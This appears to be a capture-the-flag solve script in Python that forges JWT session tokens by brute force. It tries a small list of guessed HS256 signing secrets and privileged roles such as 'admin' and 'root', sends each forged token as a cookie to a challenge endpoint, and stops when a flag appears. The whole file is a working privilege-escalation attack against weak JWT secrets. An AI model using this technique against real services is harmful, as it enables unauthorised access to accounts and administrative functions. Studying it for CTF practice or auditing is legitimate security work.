import jwt
import requests

# Target URL
url = "https://gg5z5bfszbqojno7wae76xr4ze0pyufg.lambda-url.us-east-1.on.aws/flag"

# Headers (same as the original curl request)
headers = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Language": "en-US,en;q=0.9,id;q=0.8",
    "Connection": "keep-alive",
    "DNT": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "sec-ch-ua": '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132")',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
}

# Possible secrets and roles
possible_secrets = ["secret", "admin", "key", "password", "123456", "paws"]
possible_roles = ["admin", "super_husky", "master_husky", "root"]

# JWT payload
payload = {
    "username": "paws",
    "role": "",  # Will be set dynamically
    "exp": 1739724344,
    "iat": 1739700000,
}

# Brute-force JWT tokens and make requests
for secret in possible_secrets:
    for role in possible_roles:
        payload["role"] = role
        try:
            token = jwt.encode(payload, secret, algorithm="HS256")

            # Update headers with the generated JWT
            headers["Cookie"] = f"jwt={token}"

            # Send request
            response = requests.get(url, headers=headers)

            # Print result
            print(f"\nTrying role: {role} with secret: {secret}")
            print(f"Token: {token}")
            print(f"Response Status: {response.status_code}")
            print(f"Response Text: {response.text}")

            # Check if we got a flag
            if "C2C_CTF{" in response.text:
                print("\n🎉 Flag found! 🎉")
                exit()

        except Exception as e:
            print(f"Error with {secret}: {e}")
